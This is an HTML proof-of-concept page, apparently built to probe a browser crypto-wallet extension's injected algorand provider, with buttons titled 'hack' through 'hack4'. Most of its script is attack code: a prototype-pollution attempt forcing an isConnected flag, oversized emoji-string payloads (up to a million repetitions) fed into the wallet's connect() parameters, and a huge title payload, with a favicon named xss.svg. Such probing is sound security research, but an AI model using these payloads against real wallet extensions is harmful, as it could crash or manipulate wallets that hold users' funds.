<html>
    <head>
        <title>YO</title>
        <link rel="shortcut icon" type="image/xss+svg" href="xss.svg"/>
        <!--<script src="chrome-extension://llekelocgcbelmdpkdjigdgnckkobioc/algorand-provider.js">ay no</script>-->
    </head>
    <body style="background: rgb(107,31,147); background: radial-gradient(circle, rgba(107,31,147,1) 0%, rgba(136,11,131,1) 35%, rgba(255,162,0,1) 100%);">
        <script type="module">
            // PROTOTYPE POLLUTION
            window.exodus = {}
            window.exodus.p = {}
            window.exodus.p["__proto__"]["isConnected"] = true

            //var payload = '\uD83D\uDC04'.repeat(10000000);
            //console.log("[*] " + payload);
            //document.title = payload;
        </script>

        <script>

            class MyEventDispatcher extends EventTarget {
                doSomething() {
                    this.dispatchEvent(new Event('a'));
                }
            }

            const myEventDispatcher = new MyEventDispatcher();

            function accept_connection() {
                myEventDispatcher.addEventListener('a', (e) => {
                    console.log('Instance fired "a".', e);
                });

                myEventDispatcher.doSomething();
            }

            function prot_pollute() {
                window.exodus.p = {}
                window.exodus.p["__proto__"]["isConnected"] = true
            }

            function algo_connect() {
                window.exodus.algorand.connect();
            }

            function hack() {
                var payload = '\uD83D\uDC04';
                console.log("[*] " + payload);
                window.exodus.algorand.connect({onlyIfTrusted:payload, from:"a"});
            }

            function hack2() {
                var payload = '\uD83D\uDC04';
                console.log("[*] " + payload);
                window.exodus.algorand.connect({onlyIfTrusted:false, from:payload});
            }

            function hack3() {
                var payload = '\uD83D\uDC04'.repeat(1000000);
                console.log("[*] " + payload);
                window.exodus.algorand.connect({onlyIfTrusted:payload, from:"a"});
            }

            function hack4() {
                var payload = '\uD83D\uDC04'.repeat(1000000);
                console.log("[*] " + payload);
                window.exodus.algorand.connect({onlyIfTrusted:false, from:payload});
            }

            function change_title() {
                var payload = '\uD83D\uDC04'.repeat(10000);
                //console.log("[*] " + payload);
                document.title = payload;
            }
        </script>


        <div style="margin-top:30%;padding: 6px;width:50%;background-color:#000;color:#0E0;border:7px groove #3A6">
        <h1 style="color:#E00;text-shadow: 2px 2px 4px #0f0;">
        24
        </h1>
        <h2>Can we hack x0-w?</h2>
        <input type="button" value="algo_connect" onclick="algo_connect()" />
        <input type="button" value="accept_connection" onclick="accept_connection()" />
        <input type="button" value="prot_pollute" onclick="prot_pollute()" />
        <input type="button" value="hack" onclick="hack()" />
        <input type="button" value="hack2" onclick="hack2()" />
        <input type="button" value="hack3" onclick="hack3()" />
        <input type="button" value="hack4" onclick="hack4()" />
        <input type="button" value="change_title" onclick="change_title()" />
        </div>
    </body>
</html>
